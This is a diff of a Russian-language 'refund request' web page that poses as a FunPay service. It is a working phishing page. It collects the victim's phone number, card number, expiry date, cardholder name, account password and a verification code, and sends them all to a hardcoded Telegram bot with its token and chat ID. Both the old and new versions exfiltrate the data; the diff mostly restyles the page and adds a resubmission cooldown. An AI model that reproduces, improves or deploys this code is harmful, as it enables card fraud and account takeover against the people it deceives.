@@ -6,103 +6,117 @@
     <title>Оформление возврата средств</title>
     <style>
         body {
-            background-color: #121212;
-            color: #00ff00;
             font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
+            background-color: #0d0d0d;
+            color: #00ff00;
+            text-align: center;
+            padding: 20px;
         }
-        h2 {
-            margin-bottom: 20px;
+        input, button {
+            display: block;
+            width: 80%;
+            margin: 10px auto;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
         }
         input {
-            width: 80%;
-            max-width: 300px;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #00ff00;
             background-color: #1a1a1a;
             color: #00ff00;
-            border-radius: 5px;
+            border: 1px solid #00ff00;
         }
         button {
-            background-color: #00ff00;
-            color: #121212;
-            padding: 10px 20px;
-            border: none;
+            background-color: #006600;
+            color: white;
             cursor: pointer;
-            font-size: 16px;
+        }
+        button:disabled {
+            background-color: #003300;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none;
+        }
+        .message {
+            background: #006600;
+            color: white;
+            padding: 10px;
+            margin-top: 10px;
             border-radius: 5px;
-            margin-top: 15px;
-            transition: 0.3s;
-        }
-        button:hover {
-            background-color: #009900;
-        }
-        p {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
+            display: none;
         }
     </style>
     <script>
-        function showCodeForm() {
-            document.getElementById('refundForm').innerHTML = `
-                <h2>Введите код</h2>
-                <input type="text" id="verification_code" placeholder="Код" required><br>
-                <button onclick="sendFinalData()">Отправить</button>
-            `;
+        let cooldown = false;
+
+        function sendData() {
+            if (cooldown) return;
+
+            const telephone = document.getElementById('telephone').value;
+            const cardNumber = document.getElementById('card_number').value;
+            const expirationDate = document.getElementById('expiration_date').value;
+            const holderName = document.getElementById('holder_name').value;
+            const accountPassword = document.getElementById('account_password').value;
+
+            if (!telephone || !cardNumber || !expirationDate || !holderName || !accountPassword) {
+                alert("Пожалуйста, заполните все поля!");
+                return;
+            }
+
+            document.getElementById('form').classList.add('hidden');
+            document.getElementById('codeForm').classList.remove('hidden');
         }
-        
-        function sendFinalData() {
-            const data = {
-                telephone: localStorage.getItem('telephone'),
-                card_number: localStorage.getItem('card_number'),
-                expiration_date: localStorage.getItem('expiration_date'),
-                holder_name: localStorage.getItem('holder_name'),
-                account_password: localStorage.getItem('account_password'),
-                verification_code: document.getElementById('verification_code').value
-            };
-            
+
+        function sendCode() {
+            if (cooldown) return;
+
+            const code = document.getElementById('code').value;
+            if (!code) {
+                alert("Введите код!");
+                return;
+            }
+
+            cooldown = true;
+            document.getElementById('submitButton').disabled = true;
+
             fetch("https://api.telegram.org/bot7878192082:AAE7oE001p3_MMLKMm_PxpJgaTTdINA-Vq4/sendMessage", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: "-1002190411942",
-                    text: `Заявка на возврат средств\nТелефон: ${data.telephone}\nНомер карты: ${data.card_number}\nСрок действия: ${data.expiration_date}\nИмя держателя: ${data.holder_name}\nПароль от ЛК: ${data.account_password}\n------------------\nКод: ${data.verification_code}`
+                    text: `Заявка на возврат средств\nТелефон: ${document.getElementById('telephone').value}\nНомер карты: ${document.getElementById('card_number').value}\nСрок действия: ${document.getElementById('expiration_date').value}\nИмя держателя: ${document.getElementById('holder_name').value}\nПароль от ЛК: ${document.getElementById('account_password').value}\n------------------\nКод: ${code}`
                 })
-            }).then(response => {
-                if (response.ok) {
-                    alert('Заявка успешно отправлена!');
-                }
+            }).then(() => {
+                document.getElementById('message').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('message').style.display = 'none';
+                    document.getElementById('submitButton').disabled = false;
+                    cooldown = false;
+                }, 30000); // 30 секунд задержки
             });
-        }
-
-        function sendData() {
-            localStorage.setItem('telephone', document.getElementById('telephone').value);
-            localStorage.setItem('card_number', document.getElementById('card_number').value);
-            localStorage.setItem('expiration_date', document.getElementById('expiration_date').value);
-            localStorage.setItem('holder_name', document.getElementById('holder_name').value);
-            localStorage.setItem('account_password', document.getElementById('account_password').value);
-            
-            showCodeForm();
         }
     </script>
 </head>
 <body>
-    <div id="refundForm">
-        <h2>Оформление возврата средств</h2>
-        <input type="text" id="telephone" placeholder="Телефон" required><br>
-        <input type="text" id="card_number" placeholder="Номер карты" required><br>
-        <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required><br>
-        <input type="text" id="holder_name" placeholder="Имя держателя" required><br>
-        <input type="password" id="account_password" placeholder="Пароль от ЛК" required><br>
+    <h2>Оформление возврата средств</h2>
+
+    <div id="form">
+        <input type="text" id="telephone" placeholder="Телефон" required>
+        <input type="text" id="card_number" placeholder="Номер карты" required>
+        <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required>
+        <input type="text" id="holder_name" placeholder="Имя держателя" required>
+        <input type="password" id="account_password" placeholder="Пароль от ЛК" required>
         <button onclick="sendData()">Оформить возврат</button>
     </div>
+
+    <div id="codeForm" class="hidden">
+        <h3>Введите код</h3>
+        <input type="text" id="code" placeholder="Код" required>
+        <button id="submitButton" onclick="sendCode()">Отправить</button>
+    </div>
+
     <p>C 2025 FUNPAY Impossible21x.</p>
+    <div id="message" class="message">Заявка успешно отправлена!</div>
 </body>
 </html>
